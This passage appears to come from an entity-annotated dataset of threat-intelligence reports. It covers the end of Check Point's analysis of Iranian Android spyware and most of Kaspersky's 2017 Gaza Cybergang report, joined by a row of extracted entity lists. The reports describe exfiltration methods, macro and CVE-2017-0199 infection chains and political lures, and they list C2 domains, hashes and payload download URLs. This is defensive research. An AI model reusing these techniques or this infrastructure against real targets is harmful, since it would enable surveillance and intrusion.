and bookmarks, geo-location of the victim, photos, surrounding voice recordings and more.

Who is Behind the Attack?

While the exact identity of the actor behind the attack remains unconfirmed, current
observations of those targeted, the nature of the apps and the attack infrastructure involved

1/12

https://research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig1.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig1a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig2.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig3.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig4.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig5a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig5b.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig6.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig7a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig8aa.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig8a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig9.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig10aa.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig11.jpg
https://research.checkpoint.com/the-gazorp-dark-web-azorult-builder/
https://research.checkpoint.com/ransom-warrior-decryption-tool/
https://research.checkpoint.com/sending-fax-back-to-the-dark-ages/
https://research.checkpoint.com/eternalblue-everything-know/
https://research.checkpoint.com/meet-black-rose-lucy-the-latest-russian-maas-botnet/
https://research.checkpoint.com/ceidpagelock-a-chinese-rootkit/
https://research.checkpoint.com/interactive-mapping-of-apt-c-23/


leads us to believe this operation is of Iranian origin. In fact, according to our discussions
with intelligence experts familiar with the political discourse in this part of the world, Iranian
government entities, such as the <ORG>Islamic Revolutionary Guard Corps</ORG> (<ORG>IRGC</ORG>), <ORG>Ministry of Intelligence</ORG>, <ORG>Ministry of Interior and others</ORG>, frequently conduct extensive surveillance of
these groups.

Indeed, these surveillance programs are used against individuals and groups that could
pose a threat to stability of the Iranian regime. These could include internal dissidents and
opposition forces, as well as <ORG>ISIS</ORG> advocates and the Kurdish minority settled mainly in
<COUNTRY>Western Iran</COUNTRY>.

While our investigation is still in progress, the research below reveals the full extent of
these targeted attacks, its infrastructure and victims and the possible political story behind
it. In the meantime, we have dubbed this operation ‘<THREAT_ACTOR>Domestic Kitten</THREAT_ACTOR>’ in line with the naming
of other Iranian <THREAT_ACTOR>APT</THREAT_ACTOR> attacks.

Data Collection via Mobile Applications

Victims are first lured into downloading applications which is believed to be of interest to
them. The applications our researchers discovered included an <ORG>ISIS</ORG> branded wallpaper
changer, “updates” from the <ORG>ANF</ORG> <ORG>Kurdistan news agency</ORG> and a fake version of the
messaging app, <SOFTWARE>Vidogram</SOFTWARE>.

Regarding the <ORG>ISIS</ORG>-themed application, its main functionality is setting wallpapers of <ORG>ISIS</ORG>
pictures, and therefore seems to be targeting the terror organization’s advocates.
Curiously, its Arabic name is grammatically incorrect (“ ةیمالسالا ةفالخ  ةلود  ”, which should
instead be “ ةیمالسالا ةفالخلا  ةلود  ”).

Figure 1: The application offering <ORG>ISIS</ORG>-related
wallpapers.

2/12

https://www.reuters.com/article/us-iran-cyber/once-kittens-in-cyber-spy-world-iran-gains-prowess-security-experts-idUSKCN1BV1VA


Figure 2: <ORG>ANF News Agency</ORG> website, on which the decoy app is based.

With regards to the <ORG>ANF News Agency</ORG> app, while <ORG>ANF</ORG> is a legitimate Kurdish news website
its app has been fabricated by the attackers to pose as the legitimate app in order to
deceive their targets.

Due to the names and content that is offered by the above mentioned applications then, we
are lead to believe that specific political groups and users, mainly <ORG>ISIS</ORG> supporters and the
Kurdish ethnic group, are targeted by the operation.

However, when most of the victims are actually Iranian citizens, it raises more pertinent
questions about who may be behind the attack.  Due to the attack infrastructure, reviewed
below, and its consistency with previous investigations of state-sponsored Iranian
operations covered by <ORG>Check Point</ORG> researchers, we were led to believe that Iranian
government agencies may well be behind the campaign.

Technical Analysis

A closer look at each of the applications used in the campaign show them to have the
same certificate that was issued in <TIMESTAMP>2016</TIMESTAMP>. This certificate is associated with the e-mail
address ‘<IOC>telecom2016@yahoo[.]com</IOC>’, as seen below.

Figure 3: Attack applications certificate uses the same email address
‘<IOC>telecom2016@yahoo[.]com</IOC>’

3/12



Unfortunately not much is known about this e-mail address, as it was not used to register
any domain names or to launch attacks in the past.

Another unique characteristic of the applications used, though, is that all of the samples
analyzed have several classes that are under a misspelled package name,
“<IOC>andriod.browser</IOC>”.

Figure 4: The malicious applications’ classes.

These classes are seen to be in charge of data
exfiltration, collecting sensitive information from the
victim’s device. Such information includes:

SMS/MMS messages
phone calls records
Contacts list
Browser history and bookmarks
External storage
Application list
Clipboard content
Geo-location and camera photos

Interestingly, they also collect surrounding voice
recordings.

4/12



Figure 5: Examples of the malicious code.

All of the stolen data is then send back to C&C servers using HTTP POST requests.
Additionally, one of the applications contacts <IOC>firmwaresystemupdate[.]com</IOC>, a newly
registered website that was seen to resolve to an Iranian IP address at first, but then
switched to a Russian address.

Figure 6: One of the decoy applications contact <IOC>firmwaresystemupdate[.]com</IOC>

The rest of the applications contact IP addresses directly, which unlike the previous
domain, are base64 encoded and XORed:

Figure 7: The C&C decoding.

Although these IP addresses were contacted directly, they are newly registered domains
that resolve to each of the IP addresses and they all follow the same pattern of a first
name-surname naming convention:

5/12



<IOC>Stevenwentz[.]com</IOC>

<IOC>Ronaldlubbers[.]site</IOC>

<IOC>Georgethompson[.]space</IOC>

Each victim then receives a unique device UUID (a UUID is the encoded value of device’s
android_id), which appears at the beginning of each log that is sent back to the attacker,
with the title of each log having the same structure: UUID_LogDate_LogTime.log.

When a log is created for a victim, some basic information is then collected and
documented prior to the logging of phone call details. In addition, all the logs use a unique
delimiter “~~~” to separate between the fields of the stolen data:

Figure 8: SMS log example.

The different classes then collect relevant
data, and add them to such a log that is then
zipped. Afterwards, the archive is encrypted
using AES, with the device UUID as the
encryption key, as seen in the below code:

Figure 9: The application’s encryption method.

This information is collected and sent back to C&C servers when the command is received
from the attacker. These commands also follow the same structure as the log, as it uses
the same delimiter, and can include things such as “Get File”, “Set Server”, “Get Contacts”
and more:

6/12



Figure 10: Example of commands sent from the server.

As a result of all the above, this glance into inner working of this attack infrastructure
therefore allowed us to form a precise idea about how wide this attack is and the victims
targeted.

Victim Distribution

Having analyzed the full extent of the operation, as well as some extensive information
about the attacked devices and the log files collected, we understood that around 240 users
have so far fallen victim to this surveillance campaign.

In addition, due to careful documentation of the campaign by its creators showed we were
able to learn that over 97% of its victims are Iranian, consistently aligning with our
estimation that this campaign is of Iranian origin.

In addition to the Iranian targets discovered, we also found victims from Afghanistan, Iraq
and Great Britain. Interestingly, the log documentation includes the name of the malicious
application used to intercept the victims’ data, as well as an Application Code Name field.

This field includes a short description of the app, which leads us to believe that this is a field
used by the attackers to instantly recognize the application used by the victim. Observed
code names includes ‘Daesh4’ (<ORG>ISIS4</ORG>), ‘Military News’, ‘Weapon2’, ‘Poetry Kurdish’.

Below is a visualization of the attacked devices and mobile vendors that were documented
in the logs:

7/12



Figure 11: A breakdown of attacked devices and mobile vendors.

While the number of victims and their characteristics are detailed above, the number of
people affected by this operation is actually much higher. This is due to the fact that the full
contact list stored in each victim’s mobile device, including full names and at least one of
their phone numbers, was also harvested by the attackers.

In addition, due to phone calls, SMS details, as well as the actual SMS messages, also
recorded by the attackers, the private information of thousands of totally unrelated users
has also been compromised.

————————————————————————————————————————-

<ORG>Check Point</ORG>’s Mobile solutions can protect against this type of attack. For enterprises, read
more about <SOFTWARE>Check Point’s Sand Blast Mobile</SOFTWARE>, and for consumers <SOFTWARE>Check Point’s Zone Alarm
Mobile</SOFTWARE>, to learn how you can protect your device from malicious and invasive mobile
malware.

We wish to thank <IDENTITY>Dr. Raz Zimmt</IDENTITY>, an expert on <COUNTRY>Iran</COUNTRY> at the <ORG>Institute for National Security Studies</ORG> (<ORG>INSS</ORG>), for his illuminating insights.

Indicators of Compromise

<IOC>c168f3ea7d0e2cee91612bf86c5d95167d26e69c</IOC>

<IOC>0fafeb1cbcd6b19c46a72a26a4b8e3ed588e385f</IOC>

<IOC>f1355dfe633f9e1350887c31c67490d928f4feec</IOC>

<IOC>d1f70c47c016f8a544ef240487187c2e8ea78339</IOC>

<IOC>162[.]248[.]247[.]172</IOC>

8/12

https://www.checkpoint.com/products/mobile-threat-defense/
https://www.zonealarm.com/


<IOC>190[.]2[.]144[.]140</IOC>

<IOC>190[.]2[.]145[.]145</IOC>

<IOC>89[.]38[.]98[.]49</IOC>

<IOC>Firmwaresystemupdate[.]com</IOC>

<IOC>Stevenwentz[.]com</IOC>

<IOC>Ronaldlubbers[.]site</IOC>

<IOC>Georgethompson[.]space</IOC>

Related Articles

The ‘<MALWARE>Gazorp</MALWARE>’ Dark Web <MALWARE>Azorult</MALWARE> Builder

9/12



<MALWARE>Ransom Warrior</MALWARE> Decryption Tool

<MALWARE>Faxploit</MALWARE>: Sending Fax Back to the Dark Ages

10/12



<MALWARE>EternalBlue</MALWARE> – Everything There Is To Know

Meet <MALWARE>Black Rose Lucy</MALWARE>, the Latest Russian <MALWARE>MaaS Botnet</MALWARE>

11/12



<MALWARE>CeidPageLock</MALWARE>: A Chinese RootKit

Interactive Mapping of <THREAT_ACTOR>APT-C-23</THREAT_ACTOR>

12/12


	<THREAT_ACTOR>Domestic Kitten</THREAT_ACTOR>: An Iranian Surveillance Operation
	Related Articles
	The ‘<MALWARE>Gazorp</MALWARE>’ Dark Web <MALWARE>Azorult</MALWARE> Builder
	<MALWARE>Ransom Warrior</MALWARE> Decryption Tool
	<MALWARE>Faxploit</MALWARE>: Sending Fax Back to the Dark Ages
	<MALWARE>EternalBlue</MALWARE> – Everything There Is To Know
	Meet <MALWARE>Black Rose Lucy</MALWARE>, the Latest Russian <MALWARE>MaaS Botnet</MALWARE>
	<MALWARE>CeidPageLock</MALWARE>: A Chinese RootKit
	Interactive Mapping of <THREAT_ACTOR>APT-C-23</THREAT_ACTOR>",Domestic Kitten;APT-C-23;APT,"Vidogram;Check Point’s Sand Blast Mobile;Check Point’s Zone Alarm
Mobile",,ISIS;Check Point;ANF;ANF News Agency;Islamic Revolutionary Guard Corps;IRGC;Ministry of Intelligence;Ministry of Interior and others;Kurdistan news agency;ISIS4;Institute for National Security Studies;INSS,"September 7, 2018;since 2016;2016",Gazorp;Azorult;Ransom Warrior;Faxploit;EternalBlue;Black Rose Lucy;MaaS Botnet;CeidPageLock,Middle East;Western Iran;Iran,telecom2016@yahoo[.]com;firmwaresystemupdate[.]com;Stevenwentz[.]com;Ronaldlubbers[.]site;Georgethompson[.]space;andriod.browser;c168f3ea7d0e2cee91612bf86c5d95167d26e69c;0fafeb1cbcd6b19c46a72a26a4b8e3ed588e385f;f1355dfe633f9e1350887c31c67490d928f4feec;d1f70c47c016f8a544ef240487187c2e8ea78339;162[.]248[.]247[.]172;190[.]2[.]144[.]140;190[.]2[.]145[.]145;89[.]38[.]98[.]49;Firmwaresystemupdate[.]com,Sun Tzu;Machiavelli;Thomas Hobbes;Dr. Raz Zimmt,,,,,,,,,7,3,0,22,3,16,3,20,4,0,0,0,0,0,0,0,0
Gaza Cybergang - updated activity in 2017_ - Securelist,"1. Summary information
The <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> is an Arabic-language, politically-motivated

cybercriminal group, operating <TIMESTAMP>since 2012</TIMESTAMP> and actively targeting the

<COUNTRY>MENA</COUNTRY> (<COUNTRY>Middle East North AfricaGaza</COUNTRY></COUNTRY) region. The <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR>’s attacks

have never slowed down and its typical targets include government

entities/embassies, <INDUSTRY>oil</INDUSTRY> and <INDUSTRY>gas</INDUSTRY>, <INDUSTRY>media/press</INDUSTRY>, activists, politicians, and

diplomats.

One of the interesting new facts, uncovered in <TIMESTAMP>mid-2017</TIMESTAMP>, is its discovery

inside an oil and gas organization in the <COUNTRY>MENA</COUNTRY> region, infiltrating systems

and pilfering data, apparently <TIMESTAMP>for more than a year</TIMESTAMP>.

Another interesting finding is the use of the recently discovered <CVE>CVE-2017-0199</CVE> vulnerability, and <SOFTWARE>Microsoft Access</SOFTWARE> files into which the

download scripts were embedded to reduce the likelihood of their

detection. Traces of mobile malware that started to appear from <TIMESTAMP>late April 2017</TIMESTAMP>, are also being investigated.

Recent targets for the group seem to be varied in nature; the attackers do

not appear to be choosing targets selectively, but rather seeking different

kinds of <COUNTRY>MENA</COUNTRY> intelligence.

Some of the interesting new updates about the <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR>:

<THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> attackers have continued their interest in

government entities in <COUNTRY>MENA</COUNTRY>

New targets identified include oil and gas in <COUNTRY>MENA</COUNTRY>

New tools and techniques include

Abuse of the <CVE>CVE 2017-0199</CVE> vulnerability

Usage of macros inside <SOFTWARE>Microsoft Access</SOFTWARE> files, enabling lower

detection rates

Possible <MALWARE>Android mobile malware</MALWARE> being used by attackers

Previous published research: 

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/

updated activity in
<TIMESTAMP>2017</TIMESTAMP>:
New targets, use of <SOFTWARE>MS Access</SOFTWARE>
Macros and <CVE>CVE 2017-0199</CVE>, and
possible mobile espionage

By <ORG>GReAT</ORG> on <TIMESTAMP>October 30, 2017. 9:00 am</TIMESTAMP>

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/
https://securelist.com/author/great/


<ORG>Kaspersky Lab</ORG> products and services successfully detect and block <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> attacks, detection names below:

HEUR:<MALWARE>Exploit.MSOffice.Generic</MALWARE>

HEUR:<MALWARE>Trojan.Win32.Cometer.gen</MALWARE>

HEUR:<MALWARE>Trojan.Win32.Generic</MALWARE>

<MALWARE>Trojan-Downloader.Win32.Downeks</MALWARE>

<MALWARE>Trojan-Spy.MSIL.Downeks</MALWARE>

<MALWARE>Win32.Bublik</MALWARE>

<MALWARE>Win32.Agentb</MALWARE>

More information about <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> is available to customers of the

<ORG>Kaspersky Intelligence Reporting Service</ORG>. Contact:

intelreports@kaspersky.com

2. Technical details
Previously, <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> attacks were surprisingly successful in using

simple and common tools to achieve their goals. They relied on a variety

of <MALWARE>Remote Access Trojans</MALWARE> (<MALWARE>RATs</MALWARE>) to perform their activities, including

<MALWARE>Downeks</MALWARE>, <MALWARE>Qasar</MALWARE>, <MALWARE>Cobaltstrike</MALWARE>…

As recently as <TIMESTAMP>June 2017</TIMESTAMP>, however, the attackers started using the <CVE>CVE 2017-0199</CVE> vulnerability which enables direct code execution from a

<SOFTWARE>Microsoft office</SOFTWARE> document on non-patched victim systems (<MALWARE>Cobaltstrike</MALWARE>

payload in this case). Another finding is a possible <MALWARE>Android Trojan</MALWARE> that the

attackers positioned on one of their command servers in <TIMESTAMP>April 2017</TIMESTAMP>.

In most cases, malware is sent by email as a compressed attachment or

download links. Starting from <TIMESTAMP>March 2017</TIMESTAMP>, we have observed

downloaders or <SOFTWARE>Microsoft office</SOFTWARE> documents with embedded macros

being sent to victims. When opened, the downloader would contact a

URL or IP address to retrieve the actual payload. Once successfully

executed, the malware grants full access to the attackers, providing them

with the ability to collect files, keystrokes and screenshots from victims’

devices. If the initial downloaded malware was detected by the victim, the

downloader would attempt to retrieve other malware files to the victim’s

device, in the hope that one of those files would work.

The full list of indicators of compromise (IOCs) can be found in Appendix

I. The list of the most interesting lure content, malware files and related

droppers, and command servers can be found in Appendix II.

3. Summary of recent
campaigns

mailto:intelreports@kaspersky.com


Below can be found the list of recent findings related to <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR>

operations:

Command and

control server
Hash First seen

File name/Social

engineering lure

<IOC>upgrade.newshelpyou[.]com</IOC>

<IOC>552796e71f7ff304f91b39f5da46499b</IOC>
<TIMESTAMP>25-07-2017</TIMESTAMP> nvStView.exe

<IOC>6fba58b9f9496cc52e78379de9f7f24e</IOC>
<TIMESTAMP>23-03-2017</TIMESTAMP>

 exe.صور خاصة
(Translation:

Special photos)

<IOC>eb521caebcf03df561443194c37911a5</IOC>
<TIMESTAMP>03-04-2017</TIMESTAMP>

 exe.صور خاصة
(Translation:

Special photos)

<IOC>moreoffer[.]life</IOC>
<IOC>66f144be4d4ef9c83bea528a4cd3baf3</IOC>
<TIMESTAMP>27-05-2017</TIMESTAMP>

تصريح ألمير قطر واتهام
اإلمارات في اختراق وكالة

 exe.األنباء
(Translation: A

statement by the

<IDENTITY>Emir of Qatar</IDENTITY>

accusing the <COUNTRY>UAE</COUNTRY>

of breaking the

news agency)

<IOC>3ff60c100b67697163291690e0c2c2b7</IOC>



<TIMESTAMP>11-05-2017</TIMESTAMP>
<IOC>MOM.InstallProxy.exe</IOC>

<IOC>b7390bc8c8a9a71a69ce4cc0c928153b</IOC>



<TIMESTAMP>05-04-2017</TIMESTAMP>

تعرف على المنقبة التي
 أساءت للسعودية

(Translation: Learn

about the woman

wearing niqab

which offended

Saudi)

<IOC>f43188accfb6923d62fe265d6d9c0940</IOC>



<TIMESTAMP>21-03-2017</TIMESTAMP> <IOC>Gcc-Ksa-uae.exe</IOC>

<IOC>056d83c1c1b5f905d18b3c5d58ff5342</IOC>
<TIMESTAMP>16-03-2017</TIMESTAMP>

مراسلة بخصوص اجتماع
 exe.رؤساء البعثات
(Translation:

Correspondence

regarding the

meeting of <ORG>Heads of Missions</ORG>)

<IOC>138.68.242[.]68</IOC> <IOC>87a67371770fda4c2650564cbb00934d</IOC>



<TIMESTAMP>20-06-2017</TIMESTAMP> <IOC>hamas.doc</IOC>

نقاط اتفاق حماس وتيار فتح
doc.االصالحي

(Translation: the

points of

agreement

between <ORG>Hamas</ORG>

and the reformist

<ORG>Fateh movement</ORG>) 

محضر اجتماع مركزية فتح
doc.الليلة

(Translation:

minutes of the



tonight meeting) 

سلفة أم راتب للموظفين يوم
doc.الثالثاء المقبل؟

(Translation: An

advance on salary

or full salary for

employees <TIMESTAMP>next Tuesday</TIMESTAMP>?)

<IOC>lol.mynetav[.]org</IOC>

<IOC>4f3b1a2088e473c7d2373849deb4536f</IOC>

<TIMESTAMP>20-06-2017</TIMESTAMP>

<IOC>Notepad.exe</IOC> 

<IOC>attachment.scr</IOC>

<IOC>https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU</IOC>

<IOC>signup.updatesforme[.]club</IOC>

<IOC>7d3426d8eb70e4486e803afb3eeac14f</IOC>

<TIMESTAMP>04-05-2017</TIMESTAMP>

<IOC>Palestinian Retirement Authority Ramallah.exe</IOC>

<IOC>0ee4757ab9040a95e035a667457e4bc6</IOC>

<TIMESTAMP>27-04-2017</TIMESTAMP>
<TIMESTAMP>27-4-2017</TIMESTAMP> <ORG>Fateh</ORG>

<IOC>Gaza plo.exe</IOC>

<IOC>ping.topsite[.]life</IOC>
<IOC>b68fcf8feb35a00362758fc0f92f7c2e</IOC>
<TIMESTAMP>19-03-2017</TIMESTAMP>

Downloaded by

Macro in MDB

files: 

<IOC>http://download.data-server.cloudns[.]club/indexer.exe</IOC>

<IOC>7bef124131ffc2ef3db349b980e52847</IOC>
<TIMESTAMP>13-03-2017</TIMESTAMP>

األخ اسماعيل هنية -نائب
رئيس المكتب السياسي

.exe 

(Translation:

<IDENTITY>Brother Ismail Haniyeh</IDENTITY> – Deputy Head of the <ORG>Political Bureau</ORG>)

<IOC>d87c872869023911494305ef4acbd966</IOC>

<TIMESTAMP>19-03-2017</TIMESTAMP>

Downloaded by

Macro in MDB

files:

<IOC>http://download.data-server.cloudns[.]club/wordindexer.exe</IOC>

<IOC>a3de096598e3c9c8f3ab194edc4caa76</IOC>

<TIMESTAMP>12-04-2017</TIMESTAMP> <IOC>viewimages.exe</IOC>

<IOC>c078743eac33df15af2d9a4f24159500</IOC>
<TIMESTAMP>28-03-2017</TIMESTAMP> <IOC>viewimages.exe</IOC>

<IOC>70d03e34cadb0f1e1bc6f4bf8486e4e8</IOC>

<TIMESTAMP>30-03-2017</TIMESTAMP> <IOC>download-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe</IOC>

<IOC>67f48fd24bae3e63b29edccc524f4096</IOC>

<TIMESTAMP>17-04-2017</TIMESTAMP>

<IOC>http://alasra-paper.duckdns[.]org/send/رسالة_وفد_الرئيسابومازن_لحماس_فيrar</IOC>.قطاع_غزة

(Message from President <IDENTITY>Abu Mazen</IDENTITY> to <ORG>Hamas</ORG> in <COUNTRY>Gaza Strip</COUNTRY>)

<IOC>7b536c348a21c309605fa2cd2860a41d</IOC>

<TIMESTAMP>17-04-2017</TIMESTAMP>

<IOC>http://alasra-paper.duckdns[.]org/send/ورقة_االسرى_المقدمة_لف rar</IOC>. ك_االضراب
(Translation:

captives paper

submitted to stop

the strike)

<IOC>alasra-paper.duckdns[.]org</IOC>

<MALWARE>Mobile malware</MALWARE>

N/A
<TIMESTAMP>23-04-2017</TIMESTAMP>

Possible <MALWARE>Android malware</MALWARE>.

<IOC>http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse.com/Dont-Starve-Pocket-Edition-1.04_ApkHouse.com.apk</IOC>

<IOC>hamas-wathaq.duckdns[.]org</IOC>

<IOC>cf9d89061917e9f48481db80e674f0e9</IOC>

<TIMESTAMP>16-04-2017</TIMESTAMP>

وثائق تنشر ألول مره عن
حكم حماس لقطاع غزه

.exe 

(Translation: Documents published for the first time on <ORG>Hamas</ORG> ruling of <COUNTRY>Gaza Strip</COUNTRY>)

<IOC>manual.newphoneapp[.]com</IOC>

<IOC>86a89693a273d6962825cf1846c3b6ce</IOC>

<TIMESTAMP>02-02-2017</TIMESTAMP>
<IOC>SQLiteDatabaseBrowserPortable.exe</IOC>

<IOC>3f67231f30fa742138e713085e1279a6</IOC>
<TIMESTAMP>02-02-2017</TIMESTAMP>

<IOC>SQLiteDatabaseBrowserPortable.exe</IOC>

The above listed files are further described in Appendix 1.

4. New findings
<THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> attackers have been continuously evolving their skills on

different levels, using new methods and techniques to deliver malware, in



addition to adapting social engineering decoys to regional political and

humanitarian incidents.

In <TIMESTAMP>mid-2017</TIMESTAMP>, the attackers were discovered inside an oil and gas

organization in the <COUNTRY>MENA</COUNTRY> region, infiltrating systems and pilfering data,

apparently for more than a year. The malware files that were found had

been reported previously: https://securelist.com/gaza-cybergang-

wheres-your-ir-team/72283/

While traces of <MALWARE>Android mobile malware</MALWARE> have been spotted, attackers

have continuously used the <MALWARE>Downeks</MALWARE> downloader and the <MALWARE>Quasar</MALWARE> or

<MALWARE>Cobaltstrike</MALWARE> <MALWARE>RATs</MALWARE> to target <SOFTWARE>Windows</SOFTWARE> devices, enabling them to obtain

remote access spying and data exfiltration abilities. This is now achieved

more efficiently using the <CVE>CVE 2017-0199</CVE> vulnerability which enables

direct code execution abilities from a <SOFTWARE>Microsoft office</SOFTWARE> document on non-

patched victim <SOFTWARE>Windows</SOFTWARE> systems. The use of <SOFTWARE>Microsoft Access</SOFTWARE> database

files has also enabled the attackers to maintain low levels of detection, as

it’s not an uncommon method to deliver malware.

These developments have helped the attackers continue their operations,

targeting a variety of victims and organizations, sometimes even

bypassing defences and persisting for prolonged periods.

4.1. The extended use of humanitarian
and political causes in social
engineering attacks

Attackers have continuously targeted victims and organizations in

government entities/embassies, <INDUSTRY>oil</INDUSTRY> and <INDUSTRY>gas</INDUSTRY>, <INDUSTRY>media/press</INDUSTRY>, activists,

politicians, and diplomats.

The <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> relies increasingly on advanced and up-to-date

social engineering techniques with political and humanitarian aspects that

directly reflect regional incidents. Here is a short list of incidents that were

each used multiple times:

<ORG>Palestinian Government</ORG> not paying salaries to <CITY>Gaza</CITY> employees

Palestinian prisoners’ hunger strike in Israeli jails

The political crisis in <COUNTRY>Qatar</COUNTRY>

Recent targets for the group seem to be varied in nature, the attackers do

not appear to be choosing targets selectively, but rather seeking any type

of intelligence.

4.1.1. Example lure

MD5: <IOC>66f144be4d4ef9c83bea528a4cd3baf3</IOC>

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/


exe.تصريح ألمير قطر واتهام اإلمارات في اختراق وكالة األنباء

(Translation: A statement by the <IDENTITY>Emir of Qatar</IDENTITY> accusing the <COUNTRY>UAE</COUNTRY> of

breaking the news agency)

Attackers have recently used political events related to the <COUNTRY>Qatar</COUNTRY> political

crisis in the <COUNTRY>Middle East</COUNTRY> in targeting their victims.

Original filename: <IOC>Qatar-27-5-2017.rar</IOC>

Extracts to <IOC>66f144be4d4ef9c83bea528a4cd3baf3</IOC>

exe.تصريح ألمير قطر واتهام اإلمارات في اختراق وكالة األنباء

Sha256

<IOC>7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04</IOC>

C2: <IOC>moreoffer[.]life</IOC>

First seen: <TIMESTAMP>27 May 2017</TIMESTAMP>

Translation: new details on the hack of the <ORG>Qatar News Agency</ORG>

4.2. The use of <SOFTWARE>Microsoft Access</SOFTWARE> files
with macros

<SOFTWARE>Microsoft Access</SOFTWARE> files with macro is another new development by the

attacker group. <SOFTWARE>MS Access</SOFTWARE> database-embedded macros are proving to

have very low detection rates.

MD5: <IOC>6d6f34f7cfcb64e44d67638a2f33d619</IOC>

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-1.png


Filename: <IOC>GAZA2017.mdb</IOC>

C1: http://download.data-server.cloudns[.]club/GAZA2017.mdb

Downloads and executes:

<IOC>data-server.cloudns[.]club/wordindexer.exe</IOC>

<IOC>data-server.cloudns[.]club/indexer.exe</IOC>

Translation: database of employees not receiving salaries, click “enable

content” to see data

Decrypted code

4.3. Exploitation of the <CVE>CVE 2017-0199</CVE>
vulnerability

MD5: <IOC>87a67371770fda4c2650564cbb00934d</IOC>

First seen: <TIMESTAMP>20-06-2017</TIMESTAMP>

Filenames:

doc

doc (Translation: the points of agreement.نقاط اتفاق حماس وتيار فتح االصالحي
between <ORG>Hamas</ORG> and the reforment <ORG>Fateh movement</ORG>)

doc (Translation: minutes of the tonight <ORG>Fateh</ORG>.محضر اجتماع مركزية فتح الليلة
meeting)

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-2.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-3.png


doc (Translation: An advance on salary or.سلفة أم راتب للموظفين يوم الثالثاء المقبل؟
full salary for employees <TIMESTAMP>next Tuesday</TIMESTAMP>?)

The attacks are a typical exploitation of <CVE>CVE-2017-0199</CVE>, starting with an

email that distributes a malicious RTF document. The vulnerability is in the

code that handles <MALWARE>Ole2Link</MALWARE> embedded objects, which allows <SOFTWARE>Microsoft Office Word</SOFTWARE> to run remote files, downloaded in this case from

<IOC>138.68.242[.]68</IOC>. The downloaded payload is <MALWARE>Cobaltstrike</MALWARE>, which then

connects to <IOC>lol.mynetav[.]org</IOC> to receive commands from the attackers.

Additional details on the <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR>’s use of <CVE>CVE 2017-0199</CVE> with

<MALWARE>Cobaltstrike</MALWARE>, can be found here:

http://bobao.360.cn/learning/detail/4193.html

4.4. Possible <MALWARE>Android mobile malware</MALWARE>

Traces of APK files have been seen on one of the attackers’ command

centers, <TIMESTAMP>starting from 23-04-2017</TIMESTAMP>.

URL: <IOC>http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse[.]com/Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk</IOC>

The file name (<IOC>Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk</IOC>), is

an Android application file hiding as a popular game. We believe the

<MALWARE>android Trojan</MALWARE> could be related to a previously investigated <MALWARE>Android Trojan</MALWARE> around the <CITY>Gaza</CITY> strip: https://securelist.com/breaking-the-

weakest-link-of-the-strongest-chain/77562/

5. Conclusion

http://bobao.360.cn/learning/detail/4193.html
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-4.png
https://securelist.com/breaking-the-weakest-link-of-the-strongest-chain/77562/


The <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> has demonstrated a large number of attacks and

advanced social engineering, in addition to active development of attacks,

infrastructure and the utilization of new methods and techniques.

Attackers are actively improving their toolkit in an effort to minimize their

exposure to security products and services. <ORG>Kaspersky Lab</ORG> expects these

types of attacks to intensify in the near term, both in terms of quality and

quantity.

In order to protect your company from malware, <ORG>Kaspersky Lab</ORG>

researchers recommend implementing the following measures:

Educate staff to be able to distinguish spear-phishing emails or a

phishing link from legitimate emails and links

Use proven corporate grade security solution in combination with

anti-targeted attacks solutions capable of catching attacks by

analyzing network anomalies

Provide security staff with access to the latest threat intelligence data,

which will arm them with helpful tools for targeted attacks prevention

and discovery, such as indicators of compromise and YARA rules

Make sure enterprise grade patch management processes are well

established and executed.

More information about <THREAT_ACTOR>Gaza cybergang</THREAT_ACTOR> is available to customers of

<ORG>Kaspersky Intelligence Reporting Service</ORG>. Contact:

intelreports@kaspersky.com

6. Appendix 1: malware files
description and decoys
In the following, we list the description of malware files found from <TIMESTAMP>March 2017</TIMESTAMP>, including decoys used, first dates files seen, parent files…

6.1.
<IOC>b7390bc8c8a9a71a69ce4cc0c928153b</IOC>

Parent file: <IOC>970e6188561d6c5811a8f99075888d5f</IOC> <IOC>5-4-2017.zip</IOC>

C2: <IOC>moreoffer[.]life</IOC>

First seen: <TIMESTAMP>5 April 2017</TIMESTAMP>

mailto:intelreports@kaspersky.com


Translation: Get to know the women wearing niqab and talking bad about

the kingdom

6.2.
